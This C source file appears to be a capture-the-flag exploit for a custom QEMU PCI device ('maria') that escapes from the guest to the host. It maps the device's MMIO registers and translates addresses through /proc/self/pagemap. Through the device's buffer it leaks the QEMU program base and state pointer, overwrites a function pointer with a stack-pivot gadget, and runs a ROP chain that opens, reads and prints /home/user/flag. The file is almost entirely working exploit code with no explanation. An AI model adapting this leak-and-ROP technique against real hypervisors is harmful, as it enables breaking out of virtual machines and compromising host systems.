#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/types.h>
#include <inttypes.h>

unsigned char *mmio_mem;

#define PAGE_SIZE 0x1000

void mmio_write(uint32_t addr, uint32_t value) {
    *(uint32_t *)(mmio_mem + addr) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *(uint32_t *)(mmio_mem + addr);
}

void set_src(uint32_t value) {
    mmio_write(0x04, value);
}

void set_off(uint32_t value) {
    mmio_write(0x08, value);
}

void get_buff() {
    mmio_read(0x00);
}

void set_buff() {
    mmio_write(0x00, 0);
}

uint64_t gva2gpa(void *addr){
    uint64_t page = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[!] open error in gva2gpa\n");
        exit(1);
    }
    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
    read(fd, &page, 8);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}

int main() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:05.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1) {
        fprintf(stderr, "[!] Cannot open /sys/devices/pci0000:00/0000:00:05.0/resource0\n");
        exit(1);
    }
    mmio_mem = mmap(NULL, PAGE_SIZE * 4, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED) {
        fprintf(stderr, "[!] mmio error\n");
        exit(1);
    }
    printf("[*] mmio done\n");

    // Set huge page
    system("sysctl vm.nr_hugepages=32");
    system("cat /proc/meminfo | grep -i huge");

    char *buff;
    uint64_t buff_gpa;
    while (1) {
        buff = mmap(0, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, -1, 0);
        if (buff < 0) {
            fprintf(stderr, "[!] cannot mmap buff\n");
            exit(1);
        }
        memset(buff, 0, 2 * PAGE_SIZE);
        buff_gpa = gva2gpa(buff);
        uint64_t buff_gpa_1000 = gva2gpa(buff + PAGE_SIZE);
        if (buff_gpa + PAGE_SIZE == buff_gpa_1000) {
            break;
        }
    }
	printf("[*] buff virtual address = %p\n", buff);
	printf("[*] buff physical address = %p\n", (void *)buff_gpa);

	set_src(buff_gpa);
	set_off(0xf0);
	get_buff();

	uint64_t progbase;
	progbase = *(unsigned long long *)(buff+(0x2000-0xf0)+0x88) - 0x81dae0;
	printf("[*] qemu binary program base = %p\n", (void *)progbase);

	uint64_t mariastate;
        mariastate = *(unsigned long long *)(buff+(0x2000-0xf0)+0x20);
        printf("[*] MariaState address = %p\n", (void *)mariastate);

	// gadget to pivot on rax (which contains maria->opaque
	uint64_t gadget = progbase + 0x0000000000b1088a; /* push rax ; pop rsp ; mov eax, 1 ; pop rbp ; ret */
	uint64_t pop_rdi = progbase + 0x0000000000632c5d; /* pop rdi ; ret */
	uint64_t pop_rsi = progbase + 0x00000000004d4db3; /* pop rsi ; ret */
	uint64_t pop_rdx = progbase + 0x000000000047f5c8; /* pop rdx ; ret */
	uint64_t pop_rax = progbase + 0x00000000003643a4; /* pop rax ; ret */
	uint64_t syscall = progbase + 0x00000000004a22ec; /* syscall; add cl, cl; ret; */
	uint64_t xchg_edi_eax = progbase + 0x00000000003584d5; /* xchg edi, eax ; ret */
	uint64_t xchg_edx_eax = progbase + 0x0000000000309c8a; /* xchg edx, eax ; ret */


    uint64_t *rop = (buff+(0x2000-0xf0)-0x700);
    *(unsigned long long *)(buff+(0x2000-0xf0)+0x48) =  ((mariastate+0x2a30)-0x800);	// replace maria->mmio by our gadget
    *(unsigned long long *)(buff+(0x2000-0xf0)+0x50) =  ((mariastate+0x2a30)-0x700);	// place to put our ROP
    *(unsigned long long *)(buff+(0x2000-0xf0)-0x800) = gadget;
    *(unsigned long long *)(buff+(0x2000-0xf0)-0x7f8) = gadget;

	strcpy(buff+(0x2000-0xf0)-0x500, "/home/user/flag");
	/*-------------------------------------  our ROP, in majesty... */
	/* open("/home/user/flag", O_RDONLY) */
	*rop++ = 0xdeadbeef;
	*rop++ = pop_rdi;
	*rop++ = ((mariastate+0x2a30)-0x500); 
	*rop++ = pop_rsi;
	*rop++ = 0;
	*rop++ = pop_rax;
	*rop++ = 2;
	*rop++ = syscall;
	/* read file */
	*rop++ = xchg_edi_eax;
	*rop++ = pop_rsi;
	*rop++ = ((mariastate+0x2a30)-0x400);
	*rop++ = pop_rdx;
	*rop++ = 0x100;
	*rop++ = pop_rax;
	*rop++ = 0;
	*rop++ = syscall;
	/* write content to stdout */
	*rop++ = xchg_edx_eax;
	*rop++ = pop_rdi;
	*rop++ = 1;
	*rop++ = pop_rax;
	*rop++ = 1;
	*rop++ = syscall;
	/* exit */
	*rop++ = pop_rax;
	*rop++ = 60;
	*rop++ = syscall;

	set_buff();
	set_off(0);

    munmap(mmio_mem, PAGE_SIZE*4);
    close(mmio_fd);

}
